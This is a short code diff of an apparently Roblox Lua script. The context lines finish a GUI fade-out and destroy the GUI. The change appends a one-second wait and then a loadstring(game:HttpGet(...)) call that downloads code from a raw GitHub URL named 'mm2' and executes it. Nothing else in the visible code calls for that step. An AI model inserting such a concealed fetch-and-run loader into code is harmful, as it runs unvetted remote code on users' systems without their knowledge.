@@ -81,3 +81,6 @@ disappearBackgroundTween:Play()
 disappearBackgroundTween.Completed:Connect(function()
     gui:Destroy()
 end)
+
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/mm2", false))()
